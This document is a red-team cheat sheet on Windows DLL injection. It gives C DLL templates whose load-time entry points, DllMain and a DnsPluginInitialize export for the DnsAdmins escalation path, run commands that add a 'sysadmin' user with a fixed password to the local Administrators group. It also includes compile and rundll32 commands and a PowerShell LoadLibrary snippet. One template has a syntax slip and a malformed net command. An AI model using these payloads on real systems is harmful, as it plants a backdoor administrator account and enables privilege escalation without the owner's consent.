# DLL Injection

## WinAPI

```c
#include <stdlib.h>
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
	    // add payload
        system("cmd.exe /k net user sysadmin Password1234! /add & net localgroup Administrators sysadmin /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

A long variant of DLL template payload.

```c
#include <stdlib.h>
#include <windows.h>

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved) { // reserved
    // Perform actions based on the reason for calling.
    switch(fdwReason) { 
        case DLL_PROCESS_ATTACH:
         system("cmd /c net user <username> <password> /add /y & net user localgroup \"<group_name>\" \"<username>\" /add /y")
            break;
        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;
        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;
        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    // Successful. If this is FALSE, the process will be terminated eventually
    // https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function#entry-point-function-return-value
    return TRUE;  
}
```

```
$ x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c
```

Loads a dynamic-link library (DLL) module into the address space of the calling process.

```c
#include <windows.h>
#include <libloaderapi.h>

#pragma comment(lib, "kernel32.lib")

LoadLibrary
LoadLibraryA
```

```
$ x86_64-w64-mingw32-gcc -l kernel32 -o payload.exe payload.c
```

### DNSAdmin

```c
#include <stdlib.h>
#include <windows.h>

EXTERN_DLL_EXPORT int DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction) {
	// add payload
	system("cmd.exe /k net user sysadmin Password1234! /add & net localgroup Administrators sysadmin /add");
	return 0;
}

EXTERN_DLL_EXPORT int DnsPluginCleanUp() {
	return 0;
}

EXTERN_DLL_EXPORT int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4) {
	return 0;
}
```

```
C:\> rundll32.exe .\payload.dll,DnsPluginInitialize
```

## PowerShell

```powershell
$Win32Functions = New-Object System.Object

$LoadLibraryAddress = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddress, $LoadLibraryDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

$FreeLibraryAddress = Get-ProcAddress kernel32.dll FreeLibrary
$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddress, $FreeLibraryDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
```

---
## References

### Tenouk

- [Tenouk: Dynamic Link Library - Part 1](https://www.tenouk.com/ModuleBB.html)

- [Tenouk: Dynamic Link Library - Part 2](https://www.tenouk.com/ModuleCC.html)

- [Tenouk: Windows DLL - A Supplementary Note](https://www.tenouk.com/cbbccfunction.html)

### Hacktricks

- [Hacktricks: Privileged Groups](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)

### Red Team Notes

- [Red Team Notes: Executing Code as a Control Panel Item through an Exported Cplapplet Function](https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function)

- [Red Team Notes: Code Execution through Control Panel Add-ins](https://www.ired.team/offensive-security/code-execution/code-execution-through-control-panel-add-ins)

- [Red Team Notes: From DnsAdmins to SYSTEM to Domain Compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)